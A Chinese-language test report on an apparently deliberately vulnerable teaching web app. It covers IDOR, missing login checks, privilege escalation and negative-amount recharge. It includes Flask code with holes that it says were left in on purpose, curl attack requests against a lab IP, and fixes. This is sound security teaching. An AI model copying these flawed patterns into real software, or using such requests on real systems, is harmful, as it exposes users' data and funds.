# 权限提升与业务逻辑漏洞测试报告

---

## 一、概述

### 1.1 测试目标

| 项目 | 内容 |
|------|------|
| 目标系统 | 用户信息管理平台 |
| 系统功能 | 登录、注册、搜索、头像上传、个人中心、充值 |
| 测试类型 | 权限提升漏洞 + 业务逻辑漏洞 |
| 测试日期 | 2026-07-10 |

### 1.2 什么是权限提升漏洞？

权限提升就是"**越权**"——一个普通用户做了只有管理员才能做的事。

**打个比方：** 你住酒店，你的房卡只能开自己的房门（201房）。但如果你拿着房卡去刷开了别人的房门（202房），或者刷开了员工通道，这就是"越权"。

**常见的两种越权：**
- **水平越权**：普通用户A查看普通用户B的资料（同级之间的越权）
- **垂直越权**：普通用户干了管理员才能干的事（下级越上级）

### 1.3 什么是业务逻辑漏洞？

业务逻辑漏洞就是"**钻空子**"——系统的业务流程设计有缺陷，被攻击者利用来做不合逻辑的事。

**打个比方：** 商场的积分系统，买东西送积分，积分能换礼品。但你发现买一件东西可以无限次领积分（系统没限制你领一次），这就是业务逻辑漏洞——流程设计本身有问题。

## 二、漏洞一：水平越权——查看任意用户资料

### 2.1 漏洞描述

**个人中心页面** `/profile?user_id=1` 可以查看用户资料，但系统**没有验证当前登录用户和要查看的 user_id 是否匹配**。

### 2.2 问题代码

```python
@app.route("/profile")
def profile():
    user_id = request.args.get("user_id", "")
    user_info = None
    if user_id and user_id.isdigit():
        user_info = get_user_by_id(int(user_id))
    return render_template("profile.html", user=user_info, user_id=user_id)
```

代码直接从 URL 参数取 `user_id`，查数据库返回结果。**完全没有检查"这个 user_id 是不是你自己"**。

### 2.3 攻击演示

**正常操作：** admin 查看自己的资料

```
GET /profile?user_id=1
→ 显示 admin 的信息（邮箱、手机、余额）
```

**越权操作：** admin 查看 alice 的资料（只需改 URL 中的数字）

```
GET /profile?user_id=2
→ 显示 alice 的信息（邮箱、手机、余额）✅ 越权成功！
```

### 2.4 测试结果

| user_id | 期望结果 | 实际结果 |
|:-------:|:--------:|:--------:|
| ?user_id=1 | ✅ admin 看自己 | ✅ 正常查看 |
| ?user_id=2 | ❌ admin 不应看到 alice | ✅ **越权成功，看到了 alice** |
| ?user_id=3 | ❌ admin 不应看到 testuser | ✅ **越权成功** |
| ?user_id=999 | 不存在用户 | ⚠️ 提示"未找到" |

### 2.5 你能看到什么？

通过修改 `user_id` 参数，你可以查看**所有用户**的以下敏感信息：

```
ID     用户名    邮箱                    手机          余额
─────────────────────────────────────────────────────────
1      admin     admin@example.com      13800138000   ¥99999
2      alice     alice@example.com      13900139001   ¥100
...     ...        ...                    ...          ...
```

### 2.6 为什么会有这个漏洞？

开发时要求"**不要验证当前登录用户和要查询的 user_id 是否匹配**"，所以完全没有做权限检查。这个漏洞是**故意留下的教学漏洞**。

### 2.7 修复方案

```python
@app.route("/profile")
@login_required  # 加登录验证
def profile():
    # 不从URL参数取user_id，改为从session获取
    username = session.get("username")
    user = get_user_from_db(username)
    if user:
        user = get_user_by_id(user["id"])
    ...
```

## 三、漏洞二：未授权访问——没登录也能看

### 3.1 漏洞描述

`/profile` 和 `/recharge` 接口**没有加 `@login_required` 装饰器**，未登录用户也能随意访问。

### 3.2 问题代码

```python
@app.route("/profile")
def profile():          # ← 没有 @login_required！
    ...

@app.route("/recharge", methods=["POST"])
def recharge():         # ← 没有 @login_required！
    ...
```

其他接口如 `/upload` 有登录保护：
```python
@app.route("/upload", methods=["GET", "POST"])
@login_required         # ← 有保护
def upload_file():
    ...
```

但个人中心和充值完全开放。

### 3.3 攻击演示

```bash
# 直接访问个人中心，无需登录
curl http://192.168.110.129:5000/profile?user_id=1
# → 成功返回admin的资料 ✅

# 直接充值，无需登录
curl -X POST http://192.168.110.129:5000/recharge \
  -d "user_id=2&amount=99999"
# → 成功给alice加了99999余额 ✅
```

### 3.4 修复方案

加一行装饰器就行：
```python
@app.route("/profile")
@login_required
def profile():
    ...

@app.route("/recharge", methods=["POST"])
@login_required
def recharge():
    ...
```

## 四、漏洞三：垂直越权——普通用户查看管理员资料

### 4.1 漏洞描述

由于 `/profile` 完全依赖 URL 参数 `user_id` 来判断查谁，系统中**没有角色区分**，普通用户可以随意查看管理员的资料。

### 4.2 攻击演示

**用 alice（普通用户）查看 admin（管理员）的资料：**

```
# 以alice登录后
GET /profile?user_id=1
→ 显示 admin 的信息！ ✅ 垂直越权成功
```

alice 本来只能看自己的信息（`user_id=2`），但通过修改 URL 参数为 `1`，就看到了管理员的全部资料。

### 4.3 测试结果

| 登录身份 | 访问 user_id | 结果 |
|---------|:-----------:|:----:|
| alice（user） | 2（自己） | ✅ 正常 |
| alice（user） | 1（admin） | ✅ **越权成功** |
| alice（user） | 3（testuser） | ✅ **越权成功** |
| 未登录 | 1（admin） | ✅ **无需登录也能看** |

## 五、漏洞四：业务逻辑漏洞——负数充值（恶意扣款）

### 5.1 漏洞描述

充值接口**没有检查金额是否为正数**，攻击者可以填写负数金额来"盗刷"别人的钱。

### 5.2 问题代码

```python
@app.route("/recharge", methods=["POST"])
def recharge():
    user_id = request.form.get("user_id", "")
    amount = request.form.get("amount", "0")
    if user_id.isdigit():
        c.execute(
            "UPDATE users SET balance = balance + ? WHERE id = ?",
            (float(amount), int(user_id))
        )
        # 余额 = 余额 + 金额
        # 如果金额是负数，余额就减少了……
```

### 5.3 攻击演示

```bash
# 给 alice 先充 100 块
curl -X POST http://192.168.110.129:5000/recharge \
  -d "user_id=2&amount=100"
# alice 余额: 0 + 100 = 100 ✅

# 给 alice 充 -200（扣掉200块）
curl -X POST http://192.168.110.129:5000/recharge \
  -d "user_id=2&amount=-200"
# alice 余额: 100 + (-200) = -100 ❌ 变成了负数！
```

### 5.4 测试结果

| 操作 | 金额 | 余额变化 | 结果 |
|------|:---:|:--------:|:----:|
| 正常充值 | +100 | 100099 → 100199 | ✅ 正常 |
| 负数充值 | -50 | 100199 → 100149 | ❌ **被扣钱了** |
| 大额负数 | -99999 | 100149 → 150 | ❌ **几乎扣光** |
| 让别人负 | user_id=2, amount=-99999 | alice余额变负数 | ❌ **恶意扣别人钱** |

### 5.5 为什么会有这个漏洞？

要求是"**amount 参数不要做正负校验**"，所以代码没有检查金额是否合理。这是一个**故意留下的教学漏洞**。

### 5.6 业务逻辑漏洞图解

```
            正常的业务流程                         有漏洞的业务流程
    ┌─────────────────────────┐         ┌──────────────────────────┐
    │ 用户提交充值金额 = +100  │         │ 用户提交充值金额 = -200   │
    │          ↓              │         │           ↓              │
    │  系统检查: 金额>0吗?    │         │  系统检查: 金额>0吗?     │
    │      ↓       是 ✅      │         │      ↓     没检查！      │
    │  执行: 余额 + 100       │         │  执行: 余额 + (-200)     │
    │      ↓                  │         │      ↓                  │
    │  余额增加 ✅            │         │  余额减少 ❌            │
    └─────────────────────────┘         └──────────────────────────┘
```

## 六、漏洞五：IDOR（不安全的直接对象引用）

### 6.1 漏洞描述

IDOR（Insecure Direct Object Reference）就是系统**直接使用用户提供的 ID** 来访问资源，而不检查用户是否有权限访问这个 ID。

我们的系统中 **user_id** 就是"直接对象引用"：

| 场景 | URL | 问题 |
|------|-----|------|
| 查看资料 | `/profile?user_id=1` | 直接使用 URL 中的 ID |
| 充值 | 表单隐藏字段 `user_id=1` | 直接使用表单中的 ID |

### 6.2 攻击向量汇总

```bash
# 场景1：越权查看
curl "http://192.168.110.129:5000/profile?user_id=1"      # admin
curl "http://192.168.110.129:5000/profile?user_id=2"      # alice
curl "http://192.168.110.129:5000/profile?user_id=3"      # 任意用户

# 场景2：越权充值（给别人的账号充值/扣款）
curl -X POST "http://192.168.110.129:5000/recharge" \
  -d "user_id=2&amount=-10000"                            # 扣alice的钱

# 场景3：未登录操作
curl -X POST "http://192.168.110.129:5000/recharge" \
  -d "user_id=1&amount=99999"                             # 无需登录给admin加钱
```

## 七、漏洞总结

### 7.1 漏洞汇总表

| 编号 | 漏洞名称 | 类型 | 严重程度 | 影响 |
|:---:|---------|:----:|:-------:|------|
| 01 | **水平越权** | 权限提升 | ⭐⭐⭐⭐⭐ | 查看任意用户资料 |
| 02 | **未授权访问** | 权限提升 | ⭐⭐⭐⭐⭐ | 无需登录即可操作 |
| 03 | **垂直越权** | 权限提升 | ⭐⭐⭐⭐ | 普通用户查看管理员资料 |
| 04 | **负数充值** | 业务逻辑 | ⭐⭐⭐⭐⭐ | 任意扣减他人余额 |
| 05 | **IDOR** | 权限提升 | ⭐⭐⭐⭐⭐ | 直接修改 ID 越权访问 |

### 7.2 一句话总结

> **系统的个人中心和充值功能完全没有权限校验——任何人可以通过修改 URL 参数查看所有用户的资料，可以通过修改表单值给任何人充值或扣款，甚至不需要登录。**

### 7.3 安全建议

| 建议 | 说明 |
|------|------|
| **登录保护** | 所有敏感操作接口都要加 `@login_required` |
| **身份验证** | 不能信任 URL 参数和表单中的 user_id，应从 session 获取 |
| **金额校验** | 充值时检查金额必须大于 0 |
| **权限分级** | 区分普通用户和管理员，普通用户不能查看管理员资料 |
